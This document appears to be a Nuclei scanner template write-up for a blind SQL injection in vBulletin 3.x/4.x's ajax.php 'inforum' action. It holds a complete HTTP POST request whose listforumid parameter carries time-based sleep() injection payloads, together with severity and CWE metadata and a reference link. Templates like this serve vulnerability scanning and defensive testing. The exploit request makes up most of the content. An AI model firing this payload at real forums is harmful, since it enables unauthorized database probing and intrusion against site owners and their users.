# Nuclei Template: vBulletin 3.x / 4.x AjaxReg - SQL Injection
**Template ID:** vbulletin-ajaxreg-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`vbulletin-ajaxreg-sqli.yaml`)

## Vulnerability Information & PoC

## Description
vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind SQL injection vulnerability.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

undefined&s=&securitytoken=guest
```

## References
- https://packetstormsecurity.com/files/118703/vBulletin-3.x-4.x-AjaxReg-SQL-Injection.html
